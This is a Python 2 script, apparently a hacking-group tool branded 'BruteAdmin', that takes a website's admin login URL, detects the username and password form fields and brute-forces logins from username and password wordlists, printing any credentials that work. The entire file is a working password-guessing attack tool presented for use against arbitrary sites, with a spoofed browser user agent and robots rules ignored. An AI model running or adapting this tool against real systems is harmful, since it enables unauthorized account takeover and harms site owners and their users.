#!/usr/bin/python
# -*- coding: utf-8 -*-


from colored import *
import mechanize
import itertools
import cookielib
import sys
from bs4 import *
from re import *
from urllib import *
from urllib2 import *
br = mechanize.Browser()
cookies = cookielib.LWPCookieJar()
br.set_cookiejar(cookies)
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.set_debug_http(False)
br.set_debug_responses(False)
br.set_debug_redirects(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'), ('Accept-Encoding','br')]

print (" %s \t  ______________________________________________________      %s " % (fg('green'), attr('reset')))
print (" %s \t |\ __________________________________________________ /|     %s " % (fg('green'), attr('reset')))
print (" %s \t | |    ____                  _            _          | |     %s " % (fg('green'), attr('reset')))
print (" %s \t | |   / ___| _ __  _ __ ___ | |_ ___  ___| |__  ___  | |     %s " % (fg('green'), attr('reset')))
print (" %s \t | |   \___ \| '_ \| '__/ _ \| __/ _ \/ __| '_ \/ __| | |     %s " % (fg('green'), attr('reset')))
print (" %s \t | |    ___) | |_) | | | (_) | ||  __/ (__| | | \__ \ | |     %s " % (fg('green'), attr('reset')))
print (" %s \t | |   |____/| .__/|_|  \___/ \__\___|\___|_| |_|___/ | |     %s " % (fg('green'), attr('reset')))
print (" %s \t | |         |_|                                      | |     %s " % (fg('green'), attr('reset')))
print (" %s \t | |        Coded By       : OwlMaster                | |     %s " % (fg('white'), attr('reset')))
print (" %s \t | |        Special Greetz : BlackScorp               | |     %s " % (fg('white'), attr('reset')))
print (" %s \t | |__________________________________________________| |     %s " % (fg('white'), attr('reset')))
print (" %s \t |/____________________________________________________\|     %s " % (fg('white'), attr('reset')))
print (" %s \t                                                              %s " % (fg('white'), attr('reset')))

print("""%s ____             _          _       _           _       
| __ ) _ __ _   _| |_ ___   / \   __| |_ __ ___ (_)_ __  
|  _ \| '__| | | | __/ _ \ / _ \ / _` | '_ ` _ \| | '_ \ 
| |_) | |  | |_| | ||  __// ___ \ (_| | | | | | | | | | |
|____/|_|   \__,_|\__\___/_/   \_\__,_|_| |_| |_|_|_| |_|
                                                           
%s""" % (fg(81), attr(0)))
print ("%s %s Enter the Admin Login of the site:_  %s" % (fg('18'), bg(15), attr(0)))
url = raw_input("""%s ┌─[✗]─[probros@brute@dmin]─[~]
 └──╼ $ %s""" % (fg('red'), attr('reset')))
if 'http://' in url:
    pass
elif 'https://' in url:
    url = url.replace('https://', 'http://')
else:
    url = 'http://' + url
try:
    br.open(url, timeout=10.0)
except URLError as e:
    url = 'https://' + url
    br.open(url)
forms = br.forms()

headers = str(urlopen(url).headers.headers).lower()
if 'x-frame-options:' not in headers:
    print ('%s Checking Vulnerablity %s' % (fg('yellow'), attr('reset')))
if 'cloudflare-nginx' in headers:
    print ('%s Checking Vulnerabilty %s' % (fg(44), attr(0)))
data = br.open(url).read()
if 'type="hidden"' not in data:
    print ('%s Checking Vulnerability %s' % (fg(208), attr(0)))

soup =  BeautifulSoup(data, 'lxml')
i_title = soup.find('title')
if i_title != None:
    original = i_title.contents



def wordlist_u(lst):
    try:
        with open('usernames.txt','r') as f:
            for line in f:
                final = str(line.replace("\n",""))
                lst.append(final)
    except IOError:
        print "Wordlist not found!"
        quit()
def wordlist_p(lst):
    try:
        with open('passwords.txt','r') as f:
            for line in f:
                final = str(line.replace("\n",""))
                lst.append(final)
    except IOError:
        print"Wordlist not found!"
        quit()
usernames = []
wordlist_u(usernames)

passwords = []
wordlist_p(passwords)

def find():
    form_number = 0
    for f in forms:
        data = str(f)
        username = search(r'<TextControl\([^<]*=\)>', data)

        if username:
            username = (username.group().split('<TextControl(')[1][:-3])
            print 'Username field: ' + username
            passwd = search(r'<PasswordControl\([^<]*=\)>', data)

            if passwd:
                passwd = (passwd.group().split('<PasswordControl(')[1][:-3])
                print 'Password field: ' + passwd
                select_n = search(r'SelectControl\([^<]*=', data)
 
                if select_n:
                    name = (select_n.group().split('(')[1][:-1])
                    select_o = search(r'SelectControl\([^<]*=[^<]*\)>', data)

                    if select_o:
                        menu = "True"
                        options = (select_o.group().split('=')[1][:-1]) 
                        print 'Drop-down menu found in the page.'
                        print 'Menu: ' + name 
                        print 'Options: ' + options
                        option = raw_input('Please Select an option: ') 
                        brute(username, passwd, menu, option, name, form_number)
                    else:
                        menu = "False"
                        try:
                            brute(username, passwd, menu, option, name, form_number)
                        except Exception as e:
                            cannotUseBruteForce(username, e)
                            pass							
                else:
                    menu = "False"
                    option = ""
                    name = ""
                    try:
                        brute(username, passwd, menu, option, name, form_number)
                    except Exception as e:
                       cannotUseBruteForce(username, e)
                       pass
            else:
                form_number = form_number + 1
                pass
        else:
            form_number = form_number + 1
            pass
    print 'No forms found'
def cannotUseBruteForce(username, e):
    print 'Can\'t use brute force with user %s.' % username
    print '\r    [Error: %s]' % e.message	
def brute(username, passwd, menu, option, name, form_number):
    for uname in usernames:
        progress = 1
        print 'Bruteforcing username: %s'% uname
        for password in passwords:
            sys.stdout.write('Passwords tried: %i / %i \n'% (progress, len(passwords)))
            sys.stdout.flush()
            br.open(url)  
            br.select_form(nr=form_number)
            br.form[username] = uname
            br.form[passwd] = password
            if menu == "False":
                pass
            elif menu == "True":
                br.form[name] = [option]
            else:
                pass
            resp = br.submit()
            data = resp.read()
            data_low = data.lower()
            if 'username or password' in data_low:
                pass
            else:
                soup =  BeautifulSoup(data, 'lxml')
                i_title = soup.find('title')
                if i_title == None:
                    data = data.lower()
                    if 'logout' in data:
                        print '\n Valid information found: '
                        print uname
                        print password
                        quit()
                    else:
                        pass
                else:
                    injected = i_title.contents
                    if original != injected:
                        print '\n Valid Information found: '
                        print 'Username:' + uname
                        print 'Password: ' + password
                        quit()
                
                    else:
                        pass
            progress = progress + 1
        print ''
    print 'Failed to find login!!!!!!!!! :('
    quit()
find()
